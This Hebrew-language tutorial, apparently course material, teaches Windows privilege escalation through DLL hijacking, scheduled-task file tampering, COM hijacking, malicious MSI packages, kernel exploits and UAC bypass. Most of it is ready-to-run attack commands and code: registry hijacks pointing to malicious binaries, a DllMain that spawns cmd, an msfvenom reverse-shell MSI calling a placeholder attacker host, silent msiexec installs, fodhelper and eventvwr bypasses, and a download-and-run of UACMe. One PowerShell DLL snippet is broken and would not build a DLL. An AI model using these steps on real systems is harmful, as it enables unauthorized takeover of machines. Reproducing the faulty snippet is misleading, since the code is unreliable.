
## ניצול DLL Hijacking מתקדם

אז כמו שאמרנו קודם DLL Hijacking, מתרחש כאשר תוכנה מחפשת DLL שאינו מוגן, ואנחנו יכולים להכניס קובץ משלנו עם אותו שם כדי לגרום לו לרוץ עם הרשאות התהליך.

#### **בדיקה אם התהליך מחפש DLL חסר**

1. מפעילים את `Procmon.exe` ומחפשים `NAME NOT FOUND`
2. אם נמצא DLL שחסר בספריה שיש לנו גישה אליה, נוכל לנצל זאת.

#### **יצירת DLL זדוני עם PowerShell**

```powershell
$code = @"
using System;
using System.Runtime.InteropServices;
public class Test {
    public static void Entry() {
        System.Diagnostics.Process.Start("cmd.exe");
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
[System.Reflection.Assembly]::Load($code).Entry()
```

#### **הנחת ה-DLL במקום הנכון**

אם למשל תהליך `notepad.exe` מחפש `evil.dll` בתיקיית `C:\Program Files\VulnerableApp\`, נניח שם את ה-DLL הזדוני שלנו, וכאשר התהליך ירוץ, גם הקוד שלנו ירוץ.

## ניצול Scheduled Tasks עם הרשאות גבוהות

משימות מתוזמנות ב-Windows (Scheduled Tasks) מאפשרות ביצוע פקודות בזמנים קבועים (בדומה לקרונים בלינוקס). אם יש משימה שמתבצעת עם SYSTEM וניתן לשנות את התוכן שלה – אפשר לנצל זאת.

#### **בדיקת משימות מתוזמנות קיימות**

```powershell
schtasks /query /fo LIST /v
```

אם יש משימה שמריצה קובץ `.bat` או `.exe` מתיקיה עם הרשאות כתיבה, ניתן לשנות אותו.

#### **בדיקת הרשאות כתיבה על משימות מתוזמנות**

```powershell
icacls "C:\Path\To\TaskFile.bat"
```

אם יש לנו הרשאות כתיבה, נוכל להוסיף פקודה לפתיחת `cmd.exe` בבתוך קובץ הבאט:

```powershell
echo C:\Windows\System32\cmd.exe > "C:\Path\To\TaskFile.bat"
```

וכשמערכת תפעיל את המשימה – נקבל גישת SYSTEM.


## מתקפת COM Hijacking
מנגנון **Component Object Model (COM)** כמו שאמרנו בקורס ווינדוס, הוא מנגנון של Windows שמאפשר תקשורת בין תוכנות. כאשר תוכנה מחפשת אובייקט COM מסוים ב-Registry, אם נוכל לשנות את ההגדרה שלו, נוכל לגרום לתוכנה להריץ קובץ זדוני עם הרשאות גבוהות.


### **1. בדיקת אובייקטי COM פגיעים**

מתקפת COM Hijacking מתרחשת כאשר ניתן לשנות הפניות למזהי Class ID (`CLSID`) בregistry.

#### **בדיקת CLSID שניתן לשנות**

```powershell
reg query HKCU\Software\Classes\CLSID
reg query HKLM\Software\Classes\CLSID
```

אם יש לנו הרשאות כתיבה על `CLSID`, נוכל לשנות את הפניה לתהליך זדוני.

---

### **2. ניצול COM Hijacking להפעלת קובץ זדוני**

#### **יצירת מפתח COM זדוני ברישום**

נגדיר ערך חדש שיטען את ה-Payload שלנו:

```powershell
reg add "HKCU\Software\Classes\CLSID\{E66A8652-33B3-4ABF-8A41-1C1E57B8B861}\InProcServer32" /ve /t REG_SZ /d "C:\malicious.dll" /f
```

כאשר תוכנה תחפש את `CLSID` הזה, `malicious.dll` ירוץ עם הרשאות התהליך.

---

### **3. יצירת DLL זדוני להזרקה ב-COM Hijacking**

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe");
    }
    return TRUE;
}
```

לאחר יצירת ה-DLL ושמירתו במסלול `C:\malicious.dll`, כל גישה לאובייקט COM תגרום להפעלתו.

---

### **4. שימוש ב-Procmon לזיהוי תוכנות שמחפשות CLSID**

נשתמש ב-**Procmon** כדי לראות אילו תוכנות מחפשות `CLSID` חסר, ונוכל להשתלט על הגדרה זו- ולשים לו CLSID שלנו עם dll שלנו.


## ניצול חבילות MSI (התקנות בווינדוס) ופגיעות בקרנל


### **1. ניצול Windows Installer להעלאת הרשאות**

חבילות **MSI** ב-Windows הן קבצי הרצה שמטרתן להתקין לנו תוכנות על המחשב.
חבילות אלו יכולות לרוץ עם SYSTEM, אם יש לנו הרשאות כתיבה על קובץ MSI, ניתן לנצל זאת.

#### **בדיקת קבצי MSI עם הרשאות כתיבה**

```powershell
icacls C:\Path\To\Installer.msi
```

אם ניתן לשנות אותו, נוכל להכניס לתוכו קוד זדוני.

---

### **2. יצירת חבילת MSI זדונית**

#### **יצירת MSI שמריץ cmd.exe עם SYSTEM**

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > exploit.msi
```

#### **הרצת החבילה עם SYSTEM**

```powershell
msiexec /quiet /qn /i exploit.msi
```

---

### **3. ניצול פגיעויות בקרנל להעלאת הרשאות**

אם המערכת אינה מעודכנת, ניתן לנצל חולשות קרנל.

#### **בדיקת גרסת Windows לאיתור פגיעויות קרנל**

```powershell
systeminfo | findstr /B /C:"OS Version"
```
חפשו באינטרנט השמשות לחולשות קרנליות והריצו.
נשתמש במאגר כמו **exploit-db** או **Kernel Exploit Lists** כדי למצוא אקספלויט מתאים.
דרך חולשה קרנלית, נוכל להריץ פרוסס שלנו שירוץ כSYSTEM
#### לדוגמה **CVE-2021-1732 – LPE**
נניח שיש לנו Windows 10 עם Build ישן (1909), ניתן להשתמש בניצול.
סביר להניח שהוא יהיה פגיע ל CVE-2021-1732- אשר מאפשר לנו להגיע לקרנל של מערכת ההפעלה ולהריץ קוד כsystem.


## עקיפת UAC
כמו שדיברנו עליו קודם, מנגנון **User Account Control (UAC)** היא תכונה ב-Windows שמונעת מתוכניות לפעול עם הרשאות מנהל ללא אישור המשתמש.
 אם נעקוף את UAC, נוכל להפעיל פקודות עם **Administrator** ללא התראה.


### **1. בדיקת רמת ה-UAC במערכת**

לפני שנבצע עקיפה, נבדוק אם המשתמש חבר בקבוצת **Administrators** והאם ה-UAC מאפשר עקיפה:

```powershell
whoami /groups | findstr "Administrators"
```

אם המשתמש שייך לקבוצה, ניתן לעקוף את UAC.

---

### **2. שימוש ב-FodHelper לעקיפת UAC**

קובץ **FodHelper.exe** הוא קובץ מערכת שיכול לרוץ עם הרשאות גבוהות ללא הפעלת UAC.

#### **שלבי הניצול:**

1. יוצרים ערך רישום להפניית `FodHelper.exe` לסקריפט זדוני:

```powershell
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "C:\malicious.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
```

2. מריצים את `FodHelper.exe`:

```powershell
C:\Windows\System32\fodhelper.exe
```

כעת, `malicious.exe` ירוץ עם **Administrator** ללא הודעת UAC.

---

### **3. ניצול Event Viewer לעקיפת UAC**

בדומה ל-FodHelper, ניתן לנצל את `eventvwr.exe` להרצת קובץ זדוני עם הרשאות גבוהות.

#### **הגדרת הרישום לניצול**

```powershell
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\malicious.exe" /f
```

#### **הפעלת ההתקפה**

```powershell
eventvwr.exe
```

כעת **malicious.exe** ירוץ עם הרשאות מנהל.

---

### **4. שימוש ב-UACMe לעקיפת UAC באופן אוטומטי**

כלי UACMe הוא כלי לניצול מנגנוני UAC ידועים.

```powershell
Invoke-WebRequest -Uri "https://github.com/hfiref0x/UACME/releases/latest/download/UACME.zip" -OutFile "UACME.zip"
Expand-Archive UACME.zip
.\UACME\UACMe.exe
```

ניתן לבדוק את סוגי המתקפות הקיימות ב-UACMe ולבחור את ההתקפה המתאימה.
